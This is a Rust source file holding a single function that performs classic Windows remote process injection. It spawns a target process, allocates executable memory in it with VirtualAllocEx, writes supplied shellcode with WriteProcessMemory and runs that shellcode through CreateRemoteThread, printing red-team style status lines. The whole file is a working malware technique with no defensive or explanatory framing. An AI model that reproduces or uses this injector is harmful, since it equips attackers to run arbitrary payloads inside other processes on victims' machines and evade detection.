use std::{process::Command, ptr::null_mut};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

pub fn inject_shellcode(shellcode: &[u8]) {
    let args: Vec<String> = std::env::args().collect();
    let proc_name = &args[1];

    //start process
    let mut spawned_process = Command::new(proc_name);

    //Get PID of process
    let process = spawned_process.spawn().unwrap();
    let pid = process.id();
    println!("[+] Got process ID: {}", pid);

    //Get handle for child process
    let process_handle = unsafe { kernel32::OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    println!("[+] Got process handle: {:?}", process_handle);

    //Use VirtualAllocEx to allocate memory in process
    let allocated_memory = unsafe {
        kernel32::VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            shellcode.len() as u64,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    //Check if memory was allocated
    if allocated_memory.is_null() {
        println!("[!] Failed to allocate memory");
        return;
    } else {
        println!(
            "[+] {} bytes of memory allocated memory at: {:?}",
            shellcode.len(),
            allocated_memory
        );
    }

    //Write shellcode to newly allocated memory
    println!("[*] Writing shellcode to allocated memory");
    unsafe {
        let write_success = kernel32::WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode.as_ptr() as *const std::ffi::c_void,
            shellcode.len() as u64,
            std::ptr::null_mut(),
        );
        //Check that shellcode was written to memory
        if write_success == 0 {
            println!("[!] Failed to write shellcode to allocated memory");
            return;
        } else {
            println!("[+] Shellcode written to allocated memory");
        }
    }

    //Execute shellcode
    unsafe {
        let ep: extern "system" fn(*mut std::ffi::c_void) -> u32 =
            { std::mem::transmute(allocated_memory) };
        let process_handle = kernel32::CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            Some(ep),
            null_mut(),
            0,
            null_mut(),
        );
        if process_handle.is_null() {
            println!("[!] Failed to execute shellcode");
            return;
        } else {
            println!("[+] Shellcode executed");
            kernel32::CloseHandle(process_handle);
        }
    }
}
